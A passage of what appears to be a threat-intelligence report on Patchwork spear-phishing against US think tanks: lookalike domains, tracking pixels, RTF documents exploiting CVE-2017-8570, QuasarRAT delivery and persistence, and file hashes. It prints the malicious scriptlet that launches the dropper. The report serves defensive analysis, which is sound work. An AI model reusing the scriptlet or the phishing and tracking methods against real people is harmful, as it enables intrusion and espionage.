This increase in threat\nactivity was consistent with other observations documented over the last few months in blogs\n[by 360 Threat Intelligence Center analyzing attacks on Chinese organizations and Trend](https://ti.360.net/blog/articles/analysis-of-apt-c-09-target-china/)\n[Micro noting targets in South Asia. From the attacks observed by Volexity, what is most](https://blog.trendmicro.com/trendlabs-security-intelligence/confucius-update-new-tools-and-techniques-further-connections-with-patchwork/)\nnotable is that Patchwork has pivoted its targeting and has launched attacks directly against\nUS-based think tanks. Volexity has also found that, in addition to sending malware lures, the\nPatchwork threat actors are leveraging unique tracking links in their e-mails for the purpose of\nidentifying which recipients opened their e-mail messages.\n\nIn three observed spear phishing campaigns, the threat actors leveraged domains and themes\nmimicking those of well-known think tank organizations in the United States. The group lifted\n[articles and themes from the Council on Foreign Relations (CFR), the](https://www.cfr.org/) Center for Strategic and\nInternational Studies (CSIS), and the [Mercator Institute for China Studies (MERICS) for use in](https://www.merics.org/)\ntheir spear phishing lures and malicious Rich Text Format (RTF) documents. Strangely, in one\ncase, the threat actors also appear to have used a domain name similar to the Foreign Policy\nResearch Institute (FPRI) in a message purporting to be from CFR. Each of the spear\nphishing attacks contained links to .doc files, which were really RTF documents that attempt to\nexploit CVE-2017-8570 (Composite Moniker). The threat actors appear to have leveraged\npublicly available exploit code that can be found on Github at the URL:\nhttps://github.com/rxwx/CVE-2017-8570. If the exploit is successful, the threat actors will\nattempt to drop and execute QuasarRAT. Details of the malware and the associated attacks\nare listed below.\n\n## Spear Phishing Messages\n\n\n-----\n\nEach e-mail was sent from the attacker-controlled domain mailcenter.support. This domain\nwas not only used to send the phishing e-mails, but also to track which targets opened the email. Within each of the HTML-formatted messages, an embedded image tag is used to\nbeacon home to the attacker's domain, containing an unique identifier specific to the recipient.\n\n_<img src=3D\"hxxps://www.mailcenter.support/track/<unique_32_byte_identifier>\"_\n_width=3D\"0\" height=3D\"0\" />_\n\nWhile the use of e-mail recipient tracking, a linked RTF document, and a final payload\n(QuasarRAT variant) remained the same, certain elements differed across campaigns\nobserved. Details on each of the messages are listed below.\n\nMessage 1:\n\n**Headers** **Received: by mailcenter.support**\n\n**Sender** [China Policy Analysis <[email protected]>](https://www.volexity.com/cdn-cgi/l/email-protection)\n\n**Subject** Chinas Arctic Dream\n\n\n**Body**\n\n**Notes**\n\nMessage 2:\n\n\nContent and images included within the e-mail body were a direct copy of the\nfollowing CSIS article:\nhttps://www.csis.org/analysis/chinas-arctic-dream\n\nThe hyperlinked text Download File of \"China's Arctic Dream\" within the email body lead to a malicious RTF document located at the URL\n**hxxp://chinapolicyanalysis.org/Chinas_Arctic_Dream.doc.**\n\nThe chinapolicyanalysis.org domain was used as the sender address, as well as\nthe hosting location of the malicious RTF document.\n\n\n**Headers** **Received: by mailcenter.support**\n\n**Sender** [Council on Foreign Relations <[email protected]>](https://www.volexity.com/cdn-cgi/l/email-protection)\n\n**Subject** The Four Traps China May Fall Into\n\n\n**Body**\n\n\nContent and images included within the e-mail body were a direct copy of the\nfollowing CFR article:\nhttps://www.cfr.org/blog/four-traps-china-may-fall\n\n\n-----\n\nMultiple hyperlinks within the e-mail body lead to a malicious RTF document\nlocated at the URL\n**hxxp://fprii.net/The_Four_Traps_for_China.doc.**\n\nThe fprii.net domain was used as the sender address, as well as the hosting\nlocation of the malicious RTF document. The structure of the domain mimics the\nForeign Policy Research Institute (FPRI), whose actual domain is fpri.net.\n\n**Notes**\n\nMessage 3:\n\n**Headers** **Received: by mailcenter.support**\n\n**Sender** [Mercator Institute for China Studies <[email protected]>](https://www.volexity.com/cdn-cgi/l/email-protection)\n\n**Subject** Authoritarian advance Responding to Chinas growing political influence in Europe\n\n\n**Body**\n\n**Notes**\n\n\nContent and images included within the e-mail body were a direct copy of the\nfollowing MERICS report:\nhttps://www.merics.org/sites/default/files/201802/GPPi_MERICS_Authoritarian_Advance_2018_1.pdf\n\nThe hyperlinked text Click here to download the report within the e-mail body\nlead to a malicious RTF document located at the URL\n**hxxp://www.mericcs.org/GPPi_MERICS_Authoritarian_Advance_2018_1Q.doc.**\n\nThe mericcs.org domain was used as the sender address, as well as the hosting\nlocation of the malicious RTF document. The structure of the domain mimics the\nMercator Institute for China Studies (MERICS), whose actual domain is merics.org.\n\n\nSample Message\n\nThe image below shows an example of how the spear phishing message would look to a\nrecipient.\n\n\n-----\n\n## Exploitation and Malware Execution\n\nUpon opening the above attachments, the recipient will be presented with a document that is a\ndirect copy of a blog post or report released by the think tank organization being\nimpersonated. At first glance, everything might look legitimate, but in the background the\ntarget user has likely just been infected with QuasarRAT. QuasarRAT is a freely available\n\"remote (administration|access) tool\" (RAT) written in C# and distributed via Github. This RAT\nprovides a variety of functionality that makes it particularly attractive to an attacker. This\nincludes, but is not limited to, the following:\n\nAES encryption of network communication\nFile management\nFunctionality to download, upload, and execute files\nKeylogging\nRemote desktop access\n\n\n-----\n\nRemote webcam viewing\nReverse proxy\nBrowser and FTP client password recovery\n\nThe images below are what a target user opening a malicious RTF document would see from\nwithin Microsoft Word.\n\nWhen the malicious RTF document is opened,\n[two things happen that allow the attacker malware to run. First, the \"packager trick\" is](https://securingtomorrow.mcafee.com/mcafee-labs/dropping-files-temp-folder-raises-security-concerns/)\nleveraged in order to embed the initial QuasarRAT dropper (qrat.exe) in the malicious RTF\ndocument. Its called the \"packager trick\" because any file embedded in an RTF file using\npackager will be automatically dropped to the %tmp% folder\n(c:\\Users\\%username%\\AppData\\Local\\Temp) when the RTF document is opened. Second,\nthe threat actors exploit CVE-2017-8570 to achieve code execution via a malicious \"scriptlet\"\nfile, or .sct file, which is also embedded in the malicious RTF document. The contents of the\nmalicious scriptlet file (displayed below) clearly show the threat actor executing the initial\n\"qrat.exe\" dropper from the current user's %tmp% directory.\n\n_Note: The scriptlet code is an exact match to that shown on the Github page referenced earlier_\n_for_ _[CVE-2017-8570. The string \"fjzmpcjvqp\" is unique and not something likely to be present if](https://github.com/rxwx/CVE-2017-8570)_\n_the code was not generated with the same public POC exploit code._\n\n\n-----\n\n<?XML version= 1.0 ?>\n<scriptlet>\n<registration description=\"fjzmpcjvqp\"\nprogid=\"fjzmpcjvqp\"\nversion=\"1.00\"\nclassid=\"{204774CF-D251-4F02-855B-2BE70585184B}\"\nremotable=\"true\" >\n</registration>\n<script language=\"JScript\">\n<![CDATA[\n**var r = new ActiveXObject(\"WScript.Shell\").Run(\"cmd /c**\n**%tmp%\\\\qrat.exe\",0,false);**\nexit();\n]]>\n</script>\n</scriptlet>\n\nAfter the initial dropper (qrat.exe) has been executed by the embedded scriptlet, it creates a\ndirectory in C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\n**Network\\microsoft_network\\1.0.0.0 and unpacks/drops the final QuasarRAT binary named**\n**microsoft_network.exe.**\n\nThe malware also contains an embedded .NET wrapper DLL for creating and managing\nscheduled tasks on Windows systems. The file, named Microsoft.Win32.TaskScheduler.dll, is\ndigitally signed by a certificate from AirVPN.\n\n\n-----\n\nThis DLL is used to create a scheduled task that points to the QuasarRAT binary,\n**microsoft_network.exe, allowing it to remain persistent after reboot.**\n\nAs seen in the image above, the QuasarRAT scheduled task is named\nMicrosoft_Security_Task and runs at 12:00 AM each day. Once the task is triggered, it will\nthen repeat every 5 minutes for 60 days. When executed, microsoft_network.exe will initiate\na request to freegeoip.net in order to determine the geographical location of the infected host.\nImmediately following the request, the malware will begin to beacon over an encrypted\nconnection to the threat actor's command and control domain tautiaos.com (43.249.37.199).\nSeveral related samples were identified and are included in the File Indicators section below.\n\n## Conclusion\n\nThe addition of US-based think tanks to the list of organizations in the crosshairs of Patchwork\nshows an increasing diversity in the geographic regions being targeted. While there were a\nfew peculiar components to some of the spear phish messages, the campaigns and themes\n\n\n-----\n\nwere strategically relevant to the organizations being targeted. The Patchwork threat actors\nalso appear to have adopted a technique seen from other APT groups where they are now\ntracking the effectiveness of their campaigns by recording which recipients have opened the\nphishing message. This information allows a threat actor to determine if their messages were\ndelivered, which users are more susceptible to opening them, and basic information regarding\nthe target's operating system and e-mail client (or browser). Finally, although the payload\nobserved being delivered by Patchwork in these campaigns is a readily available open source\nRAT, it does allow for flexibility in interacting with compromised machines without needing to\nuse custom malware. Volexity is actively tracking this group and the infrastructure currently in\nuse for the benefit of its network security monitoring and threat intelligence customers.\n\n## File Indicators\n\nSamples Observed from Spear Phishing Messages Above\n\n**Filename** **Chinas_Arctic_Dream.doc**\n\n**File Size** 6587812 bytes\n\n**MD5** 598eeb6a18233023f3551097aa49b083\n\n**SHA1** e9a46966f93fe15c22636a5033c61c725add8fa5\n\n\n**Notes**\n\n\nMalicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT\nfile qrat.exe.\n\n\n**Filename** **The_Four_Traps_for_China.doc**\n\n**File Size** 4428595 bytes\n\n**MD5** 7659c41a30976d523bb0fbb8cde49094\n\n**SHA1** 3f1f3e838a307aff52fbcb5bba5e4c8fe68c30e5\n\n\n**Notes**\n\n\nMalicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT\nfile qrat.exe.\n\n\n**Filename** **The_Four_Traps_for_China.doc**\n\n**File Size** 4428595 bytes\n\n**MD5** 7659c41a30976d523bb0fbb8cde49094\n\n**SHA1** 3f1f3e838a307aff52fbcb5bba5e4c8fe68c30e5\n\n\n**Notes**\n\n\nMalicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT\nfile qrat.exe.\n\n\n-----\n\n**Filename** **qrat.exe**\n\n**File Size** 1093120 bytes\n\n**MD5** c05e5131b196f43e1d02ca5ccc48ec0e\n\n**SHA1** f28c592833f234c619917b5c7d8974840a810247\n\n\n**Notes**\n\n\nDropper that installs QuasarRAT file microsoft_network.exe and scheduled task\nwrapper file Microsoft.Win32.TaskScheduler.dll.\n\n\n**Filename** **microsoft_network.exe**\n\n**File Size** 846336 bytes\n\n**MD5** 9e4c373003c6d8f6597f96fc3ff1f49c\n\n**SHA1** b7319a5ccf605fb2ff7760130e212728bccad323\n\nQuasarRAT file that beacons to hardcoded IP 43.249.37.199 and the domain\ntautiaos.com.
